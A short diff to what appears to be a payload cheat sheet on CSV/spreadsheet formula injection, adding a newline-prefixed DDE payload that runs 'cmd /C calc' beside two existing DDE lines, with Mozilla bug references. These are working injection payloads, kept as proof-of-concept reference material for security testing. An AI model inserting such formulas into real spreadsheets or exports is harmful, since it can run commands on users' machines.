@@ -14,6 +14,10 @@
 # untested
 =DDE("cmd";"/C calc";"__DdeLink_60_870516294")
 =DDE("cmd";"/C calc";"!A0")
+
+%0A-2+3+cmd|' /C calc'!D2      # %0A is NewLine which excel will
+                               # ref: https://bugzilla.mozilla.org/show_bug.cgi?id=1259881
+                               #      https://bugzilla.mozilla.org/show_bug.cgi?id=1263581
 ```
 
 ### References
